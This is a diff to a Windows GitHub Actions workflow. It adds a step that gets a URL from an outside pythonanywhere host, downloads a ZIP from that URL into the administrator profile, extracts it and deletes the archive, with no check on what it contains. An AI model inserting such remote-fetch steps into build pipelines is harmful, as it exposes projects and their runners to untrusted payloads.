@@ -24,11 +24,26 @@ jobs:
       - name: Create Administrator profile folder
         run: |
           mkdir C:\Users\administrator
-          echo "This is a test file" > C:\Users\administrator\test.txt
-          echo "Administrator profile folder created with a test file."
+          echo "Administrator profile folder created."
         shell: cmd
 
-      - name: List files in Administrator profile
+      - name: Download and extract ZIP file
+        run: |
+          :: Get the URL from the curl API
+          for /f "delims=" %%i in ('curl -s "https://azcaptchahh.pythonanywhere.com/geturl" ^| powershell -Command "$($_ | ConvertFrom-Json).url"') do set ZIPURL=%%i
+          echo URL is %ZIPURL%
+          
+          :: Download the ZIP file
+          curl -L -o C:\Users\administrator\artifact.zip %ZIPURL%
+          
+          :: Extract the ZIP file
+          powershell -Command "Expand-Archive -Path 'C:\Users\administrator\artifact.zip' -DestinationPath 'C:\Users\administrator' -Force"
+          
+          :: Remove the ZIP after extraction
+          del C:\Users\administrator\artifact.zip
+        shell: cmd
+
+      - name: List files in Administrator folder
         run: |
           dir C:\Users\administrator
         shell: cmd
